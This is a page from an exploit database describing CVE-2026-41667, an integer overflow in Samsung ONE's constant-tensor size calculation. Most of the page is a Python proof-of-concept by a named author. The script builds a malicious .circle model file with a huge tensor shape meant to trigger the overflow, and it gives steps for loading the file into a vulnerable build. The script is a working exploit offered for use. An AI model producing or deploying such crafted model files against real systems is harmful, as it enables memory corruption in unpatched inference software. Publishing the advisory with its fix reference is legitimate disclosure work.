---
title: Samsung ONE Integer Overflow in CircleConst Tensor Size Calculation
url: https://cxsecurity.com/issue/WLB-2026040018
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-04-26
fetch_date: 2026-04-27T05:06:49.967955
---

# Samsung ONE Integer Overflow in CircleConst Tensor Size Calculation

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Samsung ONE Integer Overflow in CircleConst Tensor Size Calculation**  **2026.04.26**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **[CVE-2026-41667](https://cxsecurity.com/cveshow/CVE-2026-41667/ "Click to see CVE-2026-41667")**  CWE: **[CWE-190 Integer Overflow or Wraparound](https://cxsecurity.com/cwe/CWE-190%20Integer%20Overflow%20or%20Wraparound "Click to see CWE-190 Integer Overflow or Wraparound")**  **[**Dork:** NO](https://cxsecurity.com/dorks/)** | |

#!/usr/bin/env python3
# Exploit Title: Samsung ONE - Integer Overflow in CircleConst Tensor Size Calculation
# CVE: CVE-2026-41667
# Date: 2026-04-25
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# Author GitHub: https://github.com/mbanyamer
# Vendor Homepage: https://github.com/Samsung/ONE
# Software Link: https://github.com/Samsung/ONE
# Affected: Samsung ONE prior to PR #16481 (before 1.30.0)
# Tested on: Samsung ONE (vulnerable build)
# Category: Local
# Platform: Linux
# Exploit Type: Proof of Concept - Malicious Model Generator
# CVSS: 6.6
# CWE : CWE-190
# Description: Generates a malicious .circle model that triggers integer overflow in num\_elements \* element\_size calculation.
# Fixed in: https://github.com/Samsung/ONE/pull/16481
# Usage: python3 exploit.py
#
# Examples:
# python3 exploit.py
#
# Options: None (standalone generator)
#
# Notes: Requires flatc generated 'circle' module. Loads with luci-interpreter or ONE runtime.
#
# How to Use
#
# Step 1: Generate bindings with flatc --python circle.fbs
# Step 2: Run this script to create poc\_cve\_2026\_41667.circle
# Step 3: Load the model in vulnerable ONE build
print(r"""
╔════════════════════════════════════════════════════════════════════════════════════════════╗
║ ║
║ ▄▄▄▄· ▄▄▄ . ▄▄ • ▄▄▄▄▄ ▄▄▄ ▄▄▄· ▄▄▄· ▄▄▄▄▄▄▄▄▄ .▄▄▄ ▄• ▄▌ ║
║ ▐█ ▀█▪▀▄.▀·▐█ ▀ ▪•██ ▪ ▀▄ █·▐█ ▀█ ▐█ ▄█•██ ▀▀▄.▀·▀▄ █·█▪██▌ ║
║ ▐█▀▀█▄▐▀▀▪▄▄█ ▀█ ▐█.▪ ▄█▀▄ ▐▀▀▄ ▄█▀▀█ ██▀· ▐█.▪▐▀▀▪▄▐▀▀▄ █▌▐█· ║
║ ██▄▪▐█▐█▄▄▌▐█▄▪▐█ ▐█▌·▐█▌.▐▌▐█•█▌▐█ ▪▐▌▐█▪·• ▐█▌·▐█▄▄▌▐█•█▌▐█▄█▌ ║
║ ·▀▀▀▀ ▀▀▀ ·▀▀▀▀ ▀▀▀ ▀█▄▀▪.▀ ▀ ▀ ▀ .▀ ▀▀▀ ▀▀▀ .▀ ▀ ▀▀▀ ║
║ ║
║ b a n y a m e r \_ s e c u r i t y ║
║ ║
║ >>> Silent Hunter • Shadow Presence <<< ║
║ ║
║ Operator : Mohammed Idrees Banyamer Jordan 🇯🇴 ║
║ Handle : @banyamer\_security ║
║ ║
║ CVE-2026-41667 • Samsung ONE Integer Overflow ║
║ ║
╚════════════════════════════════════════════════════════════════════════════════════════════╝
""")
import flatbuffers
import sys
import os
try:
import circle as c
except ImportError:
print("Error: 'circle' module not found.")
print("Generate it with: flatc --python compiler/luci/schema/circle.fbs")
print("Then copy the generated 'circle' folder here.")
sys.exit(1)
def create\_poc\_model(output\_path="poc\_cve\_2026\_41667.circle"):
builder = flatbuffers.Builder(1024 \* 1024)
huge\_shape = [1, 1, 1, 1 << 30]
c.ShapeStartDimsVector(builder, len(huge\_shape))
for d in reversed(huge\_shape):
builder.PrependInt32(d)
shape\_dims = builder.EndVector()
shape = c.Shape.CreateShape(builder, shape\_dims)
data\_bytes = b'\x00' \* 64
data\_vec = builder.CreateByteVector(data\_bytes)
c.CircleConstStart(builder)
c.CircleConstAddShape(builder, shape)
c.CircleConstAddDtype(builder, c.DataType.INT8)
c.CircleConstAddBuffer(builder, 0)
c.CircleConstAddValue(builder, data\_vec)
const = c.CircleConstEnd(builder)
c.SubGraphStartTensorsVector(builder, 1)
builder.PrependUOffsetTRelative(const)
tensors = builder.EndVector()
c.SubGraphStartInputsVector(builder, 1)
builder.PrependInt32(0)
subgraph\_inputs = builder.EndVector()
c.SubGraphStartOutputsVector(builder, 1)
builder.PrependInt32(0)
subgraph\_outputs = builder.EndVector()
subgraph = c.SubGraphCreateSubGraph(builder, tensors=tensors, inputs=subgraph\_inputs, outputs=subgraph\_outputs, operators=None, name=b"main")
c.ModelStartSubgraphsVector(builder, 1)
builder.PrependUOffsetTRelative(subgraph)
subgraphs = builder.EndVector()
c.ModelStart(builder)
c.ModelAddVersion(builder, 1)
c.ModelAddSubgraphs(builder, subgraphs)
model = c.ModelEnd(builder)
builder.Finish(model)
buf = builder.Output()
with open(output\_path, "wb") as f:
f.write(buf)
print(f"[+] PoC model created: {output\_path}")
print(f" Shape: {huge\_shape} → ~{1<<30} elements (INT8)")
print(f" Load with: ./luci-interpreter {output\_path}")
if \_\_name\_\_ == "\_\_main\_\_":
create\_poc\_model()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026040018)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top